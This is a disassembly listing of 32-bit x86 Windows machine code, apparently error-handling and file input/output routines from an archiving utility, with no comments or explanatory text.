  401701:	83 ec 4c             	sub    $0x4c,%esp
  401704:	ff 75 08             	push   0x8(%ebp)
  401707:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40170a:	e8 4a 00 00 00       	call   0x401759
  40170f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401712:	83 f9 08             	cmp    $0x8,%ecx
  401715:	73 1d                	jae    0x401734
  401717:	8b 45 0c             	mov    0xc(%ebp),%eax
  40171a:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  40171e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401721:	41                   	inc    %ecx
  401722:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401725:	83 f9 08             	cmp    $0x8,%ecx
  401728:	73 0a                	jae    0x401734
  40172a:	8b 45 10             	mov    0x10(%ebp),%eax
  40172d:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  401731:	ff 45 f4             	incl   -0xc(%ebp)
  401734:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  401737:	e8 57 59 00 00       	call   0x407093
  40173c:	8b e5                	mov    %ebp,%esp
  40173e:	5d                   	pop    %ebp
  40173f:	c2 0c 00             	ret    $0xc
  401742:	33 c0                	xor    %eax,%eax
  401744:	66 c7 41 08 01 00    	movw   $0x1,0x8(%ecx)
  40174a:	89 01                	mov    %eax,(%ecx)
  40174c:	89 41 04             	mov    %eax,0x4(%ecx)
  40174f:	66 89 41 0b          	mov    %ax,0xb(%ecx)
  401753:	88 41 0a             	mov    %al,0xa(%ecx)
  401756:	8b c1                	mov    %ecx,%eax
  401758:	c3                   	ret
  401759:	56                   	push   %esi
  40175a:	57                   	push   %edi
  40175b:	8b f1                	mov    %ecx,%esi
  40175d:	b8 a4 72 42 00       	mov    $0x4272a4,%eax
  401762:	6a 08                	push   $0x8
  401764:	59                   	pop    %ecx
  401765:	8b fe                	mov    %esi,%edi
  401767:	f3 ab                	rep stos %eax,%es:(%edi)
  401769:	6a 20                	push   $0x20
  40176b:	33 ff                	xor    %edi,%edi
  40176d:	8d 46 20             	lea    0x20(%esi),%eax
  401770:	57                   	push   %edi
  401771:	50                   	push   %eax
  401772:	e8 b9 24 01 00       	call   0x413c30
  401777:	8b 44 24 18          	mov    0x18(%esp),%eax
  40177b:	83 c4 0c             	add    $0xc,%esp
  40177e:	89 7e 40             	mov    %edi,0x40(%esi)
  401781:	89 7e 44             	mov    %edi,0x44(%esi)
  401784:	89 46 48             	mov    %eax,0x48(%esi)
  401787:	8b c6                	mov    %esi,%eax
  401789:	5f                   	pop    %edi
  40178a:	5e                   	pop    %esi
  40178b:	c2 04 00             	ret    $0x4
  40178e:	56                   	push   %esi
  40178f:	ff 74 24 08          	push   0x8(%esp)
  401793:	8b f1                	mov    %ecx,%esi
  401795:	6a 19                	push   $0x19
  401797:	e8 31 ff ff ff       	call   0x4016cd
  40179c:	6a 03                	push   $0x3
  40179e:	8b ce                	mov    %esi,%ecx
  4017a0:	e8 b7 01 00 00       	call   0x40195c
  4017a5:	5e                   	pop    %esi
  4017a6:	c2 04 00             	ret    $0x4
  4017a9:	32 c0                	xor    %al,%al
  4017ab:	c2 04 00             	ret    $0x4
  4017ae:	56                   	push   %esi
  4017af:	8b f1                	mov    %ecx,%esi
  4017b1:	80 7e 09 00          	cmpb   $0x0,0x9(%esi)
  4017b5:	75 17                	jne    0x4017ce
  4017b7:	ff 74 24 0c          	push   0xc(%esp)
  4017bb:	ff 74 24 0c          	push   0xc(%esp)
  4017bf:	e8 c3 5b 00 00       	call   0x407387
  4017c4:	84 c0                	test   %al,%al
  4017c6:	75 08                	jne    0x4017d0
  4017c8:	c6 46 0a 01          	movb   $0x1,0xa(%esi)
  4017cc:	eb 02                	jmp    0x4017d0
  4017ce:	32 c0                	xor    %al,%al
  4017d0:	5e                   	pop    %esi
  4017d1:	c2 08 00             	ret    $0x8
  4017d4:	56                   	push   %esi
  4017d5:	8b f1                	mov    %ecx,%esi
  4017d7:	80 7e 0b 00          	cmpb   $0x0,0xb(%esi)
  4017db:	75 0b                	jne    0x4017e8
  4017dd:	ff 74 24 08          	push   0x8(%esp)
  4017e1:	6a 0a                	push   $0xa
  4017e3:	e8 e5 fe ff ff       	call   0x4016cd
  4017e8:	6a 02                	push   $0x2
  4017ea:	8b ce                	mov    %esi,%ecx
  4017ec:	e8 6b 01 00 00       	call   0x40195c
  4017f1:	5e                   	pop    %esi
  4017f2:	c2 04 00             	ret    $0x4
  4017f5:	56                   	push   %esi
  4017f6:	ff 74 24 0c          	push   0xc(%esp)
  4017fa:	8b f1                	mov    %ecx,%esi
  4017fc:	ff 74 24 0c          	push   0xc(%esp)
  401800:	6a 09                	push   $0x9
  401802:	e8 f7 fe ff ff       	call   0x4016fe
  401807:	6a 09                	push   $0x9
  401809:	8b ce                	mov    %esi,%ecx
  40180b:	e8 4c 01 00 00       	call   0x40195c
  401810:	5e                   	pop    %esi
  401811:	c2 08 00             	ret    $0x8
  401814:	e9 8b 01 00 00       	jmp    0x4019a4
  401819:	55                   	push   %ebp
  40181a:	8b ec                	mov    %esp,%ebp
  40181c:	81 ec 00 08 00 00    	sub    $0x800,%esp
  401822:	8d 45 10             	lea    0x10(%ebp),%eax
  401825:	50                   	push   %eax
  401826:	6a 00                	push   $0x0
  401828:	ff 75 0c             	push   0xc(%ebp)
  40182b:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  401831:	68 00 04 00 00       	push   $0x400
  401836:	50                   	push   %eax
  401837:	e8 fa 01 00 00       	call   0x401a36
  40183c:	83 c4 14             	add    $0x14,%esp
  40183f:	8d 85 00 f8 ff ff    	lea    -0x800(%ebp),%eax
  401845:	50                   	push   %eax
  401846:	6a 01                	push   $0x1
  401848:	e8 80 fe ff ff       	call   0x4016cd
  40184d:	8b e5                	mov    %ebp,%esp
  40184f:	5d                   	pop    %ebp
  401850:	c3                   	ret
  401851:	ff 15 00 70 42 00    	call   *0x427000
  401857:	85 c0                	test   %eax,%eax
  401859:	74 25                	je     0x401880
  40185b:	6a 00                	push   $0x0
  40185d:	ff 74 24 0c          	push   0xc(%esp)
  401861:	ff 74 24 0c          	push   0xc(%esp)
  401865:	68 00 04 00 00       	push   $0x400
  40186a:	50                   	push   %eax
  40186b:	6a 00                	push   $0x0
  40186d:	68 00 12 00 00       	push   $0x1200
  401872:	ff 15 08 70 42 00    	call   *0x427008
  401878:	f7 d8                	neg    %eax
  40187a:	1b c0                	sbb    %eax,%eax
  40187c:	f7 d8                	neg    %eax
  40187e:	eb 02                	jmp    0x401882
  401880:	32 c0                	xor    %al,%al
  401882:	c2 08 00             	ret    $0x8
  401885:	56                   	push   %esi
  401886:	8b f1                	mov    %ecx,%esi
  401888:	e8 0b 00 00 00       	call   0x401898
  40188d:	6a 08                	push   $0x8
  40188f:	8b ce                	mov    %esi,%ecx
  401891:	e8 0e 01 00 00       	call   0x4019a4
  401896:	5e                   	pop    %esi
  401897:	c3                   	ret
  401898:	55                   	push   %ebp
  401899:	8b ec                	mov    %esp,%ebp
  40189b:	83 ec 4c             	sub    $0x4c,%esp
  40189e:	56                   	push   %esi
  40189f:	8b f1                	mov    %ecx,%esi
  4018a1:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4018a4:	6a 07                	push   $0x7
  4018a6:	e8 ae fe ff ff       	call   0x401759
  4018ab:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4018ae:	e8 e0 57 00 00       	call   0x407093
  4018b3:	6a 08                	push   $0x8
  4018b5:	8b ce                	mov    %esi,%ecx
  4018b7:	e8 a0 00 00 00       	call   0x40195c
  4018bc:	5e                   	pop    %esi
  4018bd:	8b e5                	mov    %ebp,%esp
  4018bf:	5d                   	pop    %ebp
  4018c0:	c3                   	ret
  4018c1:	56                   	push   %esi
  4018c2:	8b f1                	mov    %ecx,%esi
  4018c4:	e8 85 55 00 00       	call   0x406e4e
  4018c9:	ff 74 24 0c          	push   0xc(%esp)
  4018cd:	ff 74 24 0c          	push   0xc(%esp)
  4018d1:	6a 08                	push   $0x8
  4018d3:	e8 26 fe ff ff       	call   0x4016fe
  4018d8:	6a 06                	push   $0x6
  4018da:	8b ce                	mov    %esi,%ecx
  4018dc:	e8 7b 00 00 00       	call   0x40195c
  4018e1:	5e                   	pop    %esi
  4018e2:	c2 08 00             	ret    $0x8
  4018e5:	ff 74 24 04          	push   0x4(%esp)
  4018e9:	6a 00                	push   $0x0
  4018eb:	e8 d1 ff ff ff       	call   0x4018c1
  4018f0:	c2 04 00             	ret    $0x4
  4018f3:	56                   	push   %esi
  4018f4:	ff 74 24 08          	push   0x8(%esp)
  4018f8:	8b f1                	mov    %ecx,%esi
  4018fa:	6a 00                	push   $0x0
  4018fc:	e8 0d 00 00 00       	call   0x40190e
  401901:	6a 02                	push   $0x2
  401903:	8b ce                	mov    %esi,%ecx
  401905:	e8 9a 00 00 00       	call   0x4019a4
  40190a:	5e                   	pop    %esi
  40190b:	c2 04 00             	ret    $0x4
  40190e:	56                   	push   %esi
  40190f:	ff 74 24 0c          	push   0xc(%esp)
  401913:	8b f1                	mov    %ecx,%esi
  401915:	ff 74 24 0c          	push   0xc(%esp)
  401919:	6a 0c                	push   $0xc
  40191b:	e8 de fd ff ff       	call   0x4016fe
  401920:	6a 02                	push   $0x2
  401922:	8b ce                	mov    %esi,%ecx
  401924:	e8 33 00 00 00       	call   0x40195c
  401929:	5e                   	pop    %esi
  40192a:	c2 08 00             	ret    $0x8
  40192d:	ff 74 24 04          	push   0x4(%esp)
  401931:	6a 00                	push   $0x0
  401933:	e8 d6 ff ff ff       	call   0x40190e
  401938:	c2 04 00             	ret    $0x4
  40193b:	56                   	push   %esi
  40193c:	8b f1                	mov    %ecx,%esi
  40193e:	80 7e 0b 00          	cmpb   $0x0,0xb(%esi)
  401942:	75 0b                	jne    0x40194f
  401944:	ff 74 24 08          	push   0x8(%esp)
  401948:	6a 0b                	push   $0xb
  40194a:	e8 7e fd ff ff       	call   0x4016cd
  40194f:	6a 02                	push   $0x2
  401951:	8b ce                	mov    %esi,%ecx
  401953:	e8 4c 00 00 00       	call   0x4019a4
  401958:	5e                   	pop    %esi
  401959:	c2 04 00             	ret    $0x4
  40195c:	8b 54 24 04          	mov    0x4(%esp),%edx
  401960:	8b c2                	mov    %edx,%eax
  401962:	83 e8 01             	sub    $0x1,%eax
  401965:	74 11                	je     0x401978
  401967:	83 e8 01             	sub    $0x1,%eax
  40196a:	74 26                	je     0x401992
  40196c:	83 e8 01             	sub    $0x1,%eax
  40196f:	74 14                	je     0x401985
  401971:	2d fc 00 00 00       	sub    $0xfc,%eax
  401976:	75 05                	jne    0x40197d
  401978:	83 39 00             	cmpl   $0x0,(%ecx)
  40197b:	75 02                	jne    0x40197f
  40197d:	89 11                	mov    %edx,(%ecx)
  40197f:	ff 41 04             	incl   0x4(%ecx)
  401982:	c2 04 00             	ret    $0x4
  401985:	83 39 0b             	cmpl   $0xb,(%ecx)
  401988:	74 f5                	je     0x40197f
  40198a:	c7 01 03 00 00 00    	movl   $0x3,(%ecx)
  401990:	eb ed                	jmp    0x40197f
  401992:	83 39 00             	cmpl   $0x0,(%ecx)
  401995:	74 05                	je     0x40199c
  401997:	83 39 01             	cmpl   $0x1,(%ecx)
  40199a:	75 e3                	jne    0x40197f
  40199c:	c7 01 02 00 00 00    	movl   $0x2,(%ecx)
  4019a2:	eb db                	jmp    0x40197f
  4019a4:	55                   	push   %ebp
  4019a5:	8b ec                	mov    %esp,%ebp
  4019a7:	56                   	push   %esi
  4019a8:	8b 75 08             	mov    0x8(%ebp),%esi
  4019ab:	81 fe ff 00 00 00    	cmp    $0xff,%esi
  4019b1:	75 0b                	jne    0x4019be
  4019b3:	80 79 08 00          	cmpb   $0x0,0x8(%ecx)
  4019b7:	75 05                	jne    0x4019be
  4019b9:	5e                   	pop    %esi
  4019ba:	5d                   	pop    %ebp
  4019bb:	c2 04 00             	ret    $0x4
  4019be:	56                   	push   %esi
  4019bf:	e8 98 ff ff ff       	call   0x40195c
  4019c4:	68 f4 eb 42 00       	push   $0x42ebf4
  4019c9:	8d 45 08             	lea    0x8(%ebp),%eax
  4019cc:	89 75 08             	mov    %esi,0x8(%ebp)
  4019cf:	50                   	push   %eax
  4019d0:	e8 8b 27 01 00       	call   0x414160
  4019d5:	cc                   	int3
  4019d6:	ff 74 24 08          	push   0x8(%esp)
  4019da:	ff 74 24 08          	push   0x8(%esp)
  4019de:	6a 21                	push   $0x21
  4019e0:	e8 19 fd ff ff       	call   0x4016fe
  4019e5:	6a 02                	push   $0x2
  4019e7:	b9 d4 0c 45 00       	mov    $0x450cd4,%ecx
  4019ec:	e8 6b ff ff ff       	call   0x40195c
  4019f1:	c2 08 00             	ret    $0x8
  4019f4:	56                   	push   %esi
  4019f5:	ff 74 24 0c          	push   0xc(%esp)
  4019f9:	8b f1                	mov    %ecx,%esi
  4019fb:	ff 74 24 0c          	push   0xc(%esp)
  4019ff:	e8 0d 00 00 00       	call   0x401a11
  401a04:	6a 05                	push   $0x5
  401a06:	8b ce                	mov    %esi,%ecx
  401a08:	e8 97 ff ff ff       	call   0x4019a4
  401a0d:	5e                   	pop    %esi
  401a0e:	c2 08 00             	ret    $0x8
  401a11:	56                   	push   %esi
  401a12:	ff 74 24 0c          	push   0xc(%esp)
  401a16:	8b f1                	mov    %ecx,%esi
  401a18:	ff 74 24 0c          	push   0xc(%esp)
  401a1c:	6a 0d                	push   $0xd
  401a1e:	e8 db fc ff ff       	call   0x4016fe
  401a23:	6a 05                	push   $0x5
  401a25:	8b ce                	mov    %esi,%ecx
  401a27:	e8 30 ff ff ff       	call   0x40195c
  401a2c:	5e                   	pop    %esi
  401a2d:	c2 08 00             	ret    $0x8
  401a30:	b8 d8 3e 43 00       	mov    $0x433ed8,%eax
  401a35:	c3                   	ret
  401a36:	55                   	push   %ebp
  401a37:	8b ec                	mov    %esp,%ebp
  401a39:	ff 75 18             	push   0x18(%ebp)
  401a3c:	ff 75 14             	push   0x14(%ebp)
  401a3f:	ff 75 10             	push   0x10(%ebp)
  401a42:	ff 75 0c             	push   0xc(%ebp)
  401a45:	ff 75 08             	push   0x8(%ebp)
  401a48:	e8 e3 ff ff ff       	call   0x401a30
  401a4d:	ff 70 04             	push   0x4(%eax)
  401a50:	ff 30                	push   (%eax)
  401a52:	e8 ba 84 01 00       	call   0x419f11
  401a57:	83 c4 1c             	add    $0x1c,%esp
  401a5a:	85 c0                	test   %eax,%eax
  401a5c:	79 03                	jns    0x401a61
  401a5e:	83 c8 ff             	or     $0xffffffff,%eax
  401a61:	5d                   	pop    %ebp
  401a62:	c3                   	ret
  401a63:	83 49 04 ff          	orl    $0xffffffff,0x4(%ecx)
  401a67:	33 c0                	xor    %eax,%eax
  401a69:	89 41 1c             	mov    %eax,0x1c(%ecx)
  401a6c:	88 41 08             	mov    %al,0x8(%ecx)
  401a6f:	89 41 0c             	mov    %eax,0xc(%ecx)
  401a72:	88 41 10             	mov    %al,0x10(%ecx)
  401a75:	89 81 20 10 00 00    	mov    %eax,0x1020(%ecx)
  401a7b:	88 41 15             	mov    %al,0x15(%ecx)
  401a7e:	8b c1                	mov    %ecx,%eax
  401a80:	c7 01 a8 72 42 00    	movl   $0x4272a8,(%ecx)
  401a86:	c7 41 11 00 00 01 01 	movl   $0x1010000,0x11(%ecx)
  401a8d:	c7 41 18 00 01 00 00 	movl   $0x100,0x18(%ecx)
  401a94:	c3                   	ret
  401a95:	33 c0                	xor    %eax,%eax
  401a97:	89 81 10 10 00 00    	mov    %eax,0x1010(%ecx)
  401a9d:	89 81 14 10 00 00    	mov    %eax,0x1014(%ecx)
  401aa3:	89 81 18 10 00 00    	mov    %eax,0x1018(%ecx)
  401aa9:	89 81 1c 10 00 00    	mov    %eax,0x101c(%ecx)
  401aaf:	89 81 20 10 00 00    	mov    %eax,0x1020(%ecx)
  401ab5:	89 81 24 10 00 00    	mov    %eax,0x1024(%ecx)
  401abb:	8b c1                	mov    %ecx,%eax
  401abd:	c3                   	ret
  401abe:	55                   	push   %ebp
  401abf:	8b ec                	mov    %esp,%ebp
  401ac1:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401ac7:	6a ff                	push   $0xffffffff
  401ac9:	68 96 64 42 00       	push   $0x426496
  401ace:	50                   	push   %eax
  401acf:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401ad6:	83 79 04 ff          	cmpl   $0xffffffff,0x4(%ecx)
  401ada:	c7 01 a8 72 42 00    	movl   $0x4272a8,(%ecx)
  401ae0:	74 18                	je     0x401afa
  401ae2:	80 79 10 00          	cmpb   $0x0,0x10(%ecx)
  401ae6:	75 12                	jne    0x401afa
  401ae8:	80 79 12 00          	cmpb   $0x0,0x12(%ecx)
  401aec:	74 07                	je     0x401af5
  401aee:	e8 7e 01 00 00       	call   0x401c71
  401af3:	eb 05                	jmp    0x401afa
  401af5:	e8 30 00 00 00       	call   0x401b2a
  401afa:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401afd:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401b04:	8b e5                	mov    %ebp,%esp
  401b06:	5d                   	pop    %ebp
  401b07:	c3                   	ret
  401b08:	56                   	push   %esi
  401b09:	8b f1                	mov    %ecx,%esi
  401b0b:	e8 ae ff ff ff       	call   0x401abe
  401b10:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  401b15:	74 0d                	je     0x401b24
  401b17:	68 24 10 00 00       	push   $0x1024
  401b1c:	56                   	push   %esi
  401b1d:	e8 fe 10 01 00       	call   0x412c20
  401b22:	59                   	pop    %ecx
  401b23:	59                   	pop    %ecx
  401b24:	8b c6                	mov    %esi,%eax
  401b26:	5e                   	pop    %esi
  401b27:	c2 04 00             	ret    $0x4
  401b2a:	53                   	push   %ebx
  401b2b:	56                   	push   %esi
  401b2c:	8b f1                	mov    %ecx,%esi
  401b2e:	b3 01                	mov    $0x1,%bl
  401b30:	83 7e 04 ff          	cmpl   $0xffffffff,0x4(%esi)
  401b34:	74 22                	je     0x401b58
  401b36:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  401b3a:	75 18                	jne    0x401b54
  401b3c:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  401b40:	75 12                	jne    0x401b54
  401b42:	ff 76 04             	push   0x4(%esi)
  401b45:	ff 15 2c 70 42 00    	call   *0x42702c
  401b4b:	8d 58 ff             	lea    -0x1(%eax),%ebx
  401b4e:	f7 db                	neg    %ebx
  401b50:	1a db                	sbb    %bl,%bl
  401b52:	fe c3                	inc    %bl
  401b54:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  401b58:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  401b5c:	84 db                	test   %bl,%bl
  401b5e:	75 13                	jne    0x401b73
  401b60:	38 5e 14             	cmp    %bl,0x14(%esi)
  401b63:	74 0e                	je     0x401b73
  401b65:	8d 46 1e             	lea    0x1e(%esi),%eax
  401b68:	b9 d4 0c 45 00       	mov    $0x450cd4,%ecx
  401b6d:	50                   	push   %eax
  401b6e:	e8 61 fc ff ff       	call   0x4017d4
  401b73:	5e                   	pop    %esi
  401b74:	8a c3                	mov    %bl,%al
  401b76:	5b                   	pop    %ebx
  401b77:	c3                   	ret
  401b78:	b8 04 10 00 00       	mov    $0x1004,%eax
  401b7d:	e8 4e 10 01 00       	call   0x412bd0
  401b82:	53                   	push   %ebx
  401b83:	8b 9c 24 10 10 00 00 	mov    0x1010(%esp),%ebx
  401b8a:	8b c3                	mov    %ebx,%eax
  401b8c:	55                   	push   %ebp
  401b8d:	d1 e8                	shr    $1,%eax
  401b8f:	56                   	push   %esi
  401b90:	24 01                	and    $0x1,%al
  401b92:	8b f1                	mov    %ecx,%esi
  401b94:	57                   	push   %edi
  401b95:	f6 c3 10             	test   $0x10,%bl
  401b98:	75 0a                	jne    0x401ba4
  401b9a:	80 7e 1d 00          	cmpb   $0x0,0x1d(%esi)
  401b9e:	75 04                	jne    0x401ba4
  401ba0:	33 ed                	xor    %ebp,%ebp
  401ba2:	eb 03                	jmp    0x401ba7
  401ba4:	33 ed                	xor    %ebp,%ebp
  401ba6:	45                   	inc    %ebp
  401ba7:	ff b4 24 18 10 00 00 	push   0x1018(%esp)
  401bae:	33 c9                	xor    %ecx,%ecx
  401bb0:	89 5e 18             	mov    %ebx,0x18(%esi)
  401bb3:	84 c0                	test   %al,%al
  401bb5:	0f 94 c1             	sete   %cl
  401bb8:	49                   	dec    %ecx
  401bb9:	81 e1 00 00 00 80    	and    $0x80000000,%ecx
  401bbf:	81 c1 00 00 00 c0    	add    $0xc0000000,%ecx
  401bc5:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401bc9:	e8 09 1a 00 00       	call   0x4035d7
  401bce:	0f b7 00             	movzwl (%eax),%eax
  401bd1:	83 f8 2e             	cmp    $0x2e,%eax
  401bd4:	74 05                	je     0x401bdb
  401bd6:	83 f8 20             	cmp    $0x20,%eax
  401bd9:	75 11                	jne    0x401bec
  401bdb:	f6 c3 20             	test   $0x20,%bl
  401bde:	75 0c                	jne    0x401bec
  401be0:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  401be4:	33 db                	xor    %ebx,%ebx
  401be6:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401bea:	eb 1d                	jmp    0x401c09
  401bec:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401bf0:	33 db                	xor    %ebx,%ebx
  401bf2:	53                   	push   %ebx
  401bf3:	53                   	push   %ebx
  401bf4:	6a 02                	push   $0x2
  401bf6:	53                   	push   %ebx
  401bf7:	55                   	push   %ebp
  401bf8:	57                   	push   %edi
  401bf9:	ff b4 24 30 10 00 00 	push   0x1030(%esp)
  401c00:	ff 15 30 70 42 00    	call   *0x427030
  401c06:	89 46 04             	mov    %eax,0x4(%esi)
  401c09:	83 7e 04 ff          	cmpl   $0xffffffff,0x4(%esi)
  401c0d:	75 2f                	jne    0x401c3e
  401c0f:	68 00 08 00 00       	push   $0x800
  401c14:	8d 44 24 18          	lea    0x18(%esp),%eax
  401c18:	50                   	push   %eax
  401c19:	ff b4 24 20 10 00 00 	push   0x1020(%esp)
  401c20:	e8 a3 16 00 00       	call   0x4032c8
  401c25:	84 c0                	test   %al,%al
  401c27:	74 15                	je     0x401c3e
  401c29:	53                   	push   %ebx
  401c2a:	53                   	push   %ebx
  401c2b:	6a 02                	push   $0x2
  401c2d:	53                   	push   %ebx
  401c2e:	55                   	push   %ebp
  401c2f:	57                   	push   %edi
  401c30:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401c34:	50                   	push   %eax
  401c35:	ff 15 30 70 42 00    	call   *0x427030
  401c3b:	89 46 04             	mov    %eax,0x4(%esi)
  401c3e:	68 00 08 00 00       	push   $0x800
  401c43:	ff b4 24 1c 10 00 00 	push   0x101c(%esp)
  401c4a:	8d 46 1e             	lea    0x1e(%esi),%eax
  401c4d:	c6 46 12 01          	movb   $0x1,0x12(%esi)
  401c51:	50                   	push   %eax
  401c52:	89 5e 0c             	mov    %ebx,0xc(%esi)
  401c55:	88 5e 10             	mov    %bl,0x10(%esi)
  401c58:	e8 7e 49 00 00       	call   0x4065db
  401c5d:	83 7e 04 ff          	cmpl   $0xffffffff,0x4(%esi)
  401c61:	5f                   	pop    %edi
  401c62:	5e                   	pop    %esi
  401c63:	5d                   	pop    %ebp
  401c64:	0f 95 c0             	setne  %al
  401c67:	5b                   	pop    %ebx
  401c68:	81 c4 04 10 00 00    	add    $0x1004,%esp
  401c6e:	c2 08 00             	ret    $0x8
  401c71:	56                   	push   %esi
  401c72:	8b f1                	mov    %ecx,%esi
  401c74:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  401c78:	74 04                	je     0x401c7e
  401c7a:	32 c0                	xor    %al,%al
  401c7c:	5e                   	pop    %esi
  401c7d:	c3                   	ret
  401c7e:	83 7e 04 ff          	cmpl   $0xffffffff,0x4(%esi)
  401c82:	74 05                	je     0x401c89
  401c84:	8b 06                	mov    (%esi),%eax
  401c86:	ff 50 08             	call   *0x8(%eax)
  401c89:	80 7e 13 00          	cmpb   $0x0,0x13(%esi)
  401c8d:	74 eb                	je     0x401c7a
  401c8f:	8d 46 1e             	lea    0x1e(%esi),%eax
  401c92:	50                   	push   %eax
  401c93:	e8 42 07 00 00       	call   0x4023da
  401c98:	5e                   	pop    %esi
  401c99:	c3                   	ret
  401c9a:	55                   	push   %ebp
  401c9b:	8b ec                	mov    %esp,%ebp
  401c9d:	51                   	push   %ecx
  401c9e:	53                   	push   %ebx
  401c9f:	56                   	push   %esi
  401ca0:	8b f1                	mov    %ecx,%esi
  401ca2:	83 7e 0c 01          	cmpl   $0x1,0xc(%esi)
  401ca6:	75 0b                	jne    0x401cb3
  401ca8:	6a f6                	push   $0xfffffff6
  401caa:	ff 15 10 70 42 00    	call   *0x427010
  401cb0:	89 46 04             	mov    %eax,0x4(%esi)
  401cb3:	6a 00                	push   $0x0
  401cb5:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401cb8:	50                   	push   %eax
  401cb9:	ff 75 0c             	push   0xc(%ebp)
  401cbc:	ff 75 08             	push   0x8(%ebp)
  401cbf:	ff 76 04             	push   0x4(%esi)
  401cc2:	ff 15 18 70 42 00    	call   *0x427018
  401cc8:	85 c0                	test   %eax,%eax
  401cca:	75 5a                	jne    0x401d26
  401ccc:	8b ce                	mov    %esi,%ecx
  401cce:	e8 a8 00 00 00       	call   0x401d7b
  401cd3:	84 c0                	test   %al,%al
  401cd5:	74 17                	je     0x401cee
  401cd7:	b8 20 4e 00 00       	mov    $0x4e20,%eax
  401cdc:	39 45 0c             	cmp    %eax,0xc(%ebp)
  401cdf:	76 0d                	jbe    0x401cee
  401ce1:	50                   	push   %eax
  401ce2:	ff 75 08             	push   0x8(%ebp)
  401ce5:	8b ce                	mov    %esi,%ecx
  401ce7:	e8 ae ff ff ff       	call   0x401c9a
  401cec:	eb 3b                	jmp    0x401d29
  401cee:	83 7e 0c 01          	cmpl   $0x1,0xc(%esi)
  401cf2:	75 0f                	jne    0x401d03
  401cf4:	ff 15 00 70 42 00    	call   *0x427000
  401cfa:	83 f8 6d             	cmp    $0x6d,%eax
  401cfd:	75 04                	jne    0x401d03
  401cff:	33 c0                	xor    %eax,%eax
  401d01:	eb 26                	jmp    0x401d29
  401d03:	83 7e 0c 00          	cmpl   $0x0,0xc(%esi)
  401d07:	75 18                	jne    0x401d21
  401d09:	bb 00 80 00 00       	mov    $0x8000,%ebx
  401d0e:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  401d11:	76 0e                	jbe    0x401d21
  401d13:	ff 15 00 70 42 00    	call   *0x427000
  401d19:	83 f8 21             	cmp    $0x21,%eax
  401d1c:	75 03                	jne    0x401d21
  401d1e:	53                   	push   %ebx
  401d1f:	eb c1                	jmp    0x401ce2
  401d21:	83 c8 ff             	or     $0xffffffff,%eax
  401d24:	eb 03                	jmp    0x401d29
  401d26:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401d29:	5e                   	pop    %esi
  401d2a:	5b                   	pop    %ebx
  401d2b:	8b e5                	mov    %ebp,%esp
  401d2d:	5d                   	pop    %ebp
  401d2e:	c2 08 00             	ret    $0x8
  401d31:	51                   	push   %ecx
  401d32:	51                   	push   %ecx
  401d33:	53                   	push   %ebx
  401d34:	8b d9                	mov    %ecx,%ebx
  401d36:	55                   	push   %ebp
  401d37:	56                   	push   %esi
  401d38:	57                   	push   %edi
  401d39:	8b 03                	mov    (%ebx),%eax
  401d3b:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401d3f:	ff 50 14             	call   *0x14(%eax)
  401d42:	8b 33                	mov    (%ebx),%esi
  401d44:	8b cb                	mov    %ebx,%ecx
  401d46:	6a 02                	push   $0x2
  401d48:	6a 00                	push   $0x0
  401d4a:	6a 00                	push   $0x0
  401d4c:	89 44 24 20          	mov    %eax,0x20(%esp)
  401d50:	8b ea                	mov    %edx,%ebp
  401d52:	ff 56 10             	call   *0x10(%esi)
  401d55:	8b 33                	mov    (%ebx),%esi
  401d57:	8b cb                	mov    %ebx,%ecx
  401d59:	ff 56 14             	call   *0x14(%esi)
  401d5c:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401d60:	8b f8                	mov    %eax,%edi
  401d62:	6a 00                	push   $0x0
  401d64:	55                   	push   %ebp
  401d65:	ff 74 24 1c          	push   0x1c(%esp)
  401d69:	8b 31                	mov    (%ecx),%esi
  401d6b:	8b da                	mov    %edx,%ebx
  401d6d:	ff 56 10             	call   *0x10(%esi)
  401d70:	8b c7                	mov    %edi,%eax
  401d72:	8b d3                	mov    %ebx,%edx
  401d74:	5f                   	pop    %edi
  401d75:	5e                   	pop    %esi
  401d76:	5d                   	pop    %ebp
  401d77:	5b                   	pop    %ebx
  401d78:	59                   	pop    %ecx
  401d79:	59                   	pop    %ecx
  401d7a:	c3                   	ret
  401d7b:	83 79 04 ff          	cmpl   $0xffffffff,0x4(%ecx)
  401d7f:	75 03                	jne    0x401d84
  401d81:	32 c0                	xor    %al,%al
  401d83:	c3                   	ret
  401d84:	ff 71 04             	push   0x4(%ecx)
  401d87:	ff 15 0c 70 42 00    	call   *0x42700c
  401d8d:	83 f8 02             	cmp    $0x2,%eax
  401d90:	74 08                	je     0x401d9a
  401d92:	83 f8 03             	cmp    $0x3,%eax
  401d95:	74 03                	je     0x401d9a
  401d97:	33 c0                	xor    %eax,%eax
  401d99:	c3                   	ret
  401d9a:	33 c0                	xor    %eax,%eax
  401d9c:	40                   	inc    %eax
  401d9d:	c3                   	ret
  401d9e:	83 79 04 ff          	cmpl   $0xffffffff,0x4(%ecx)
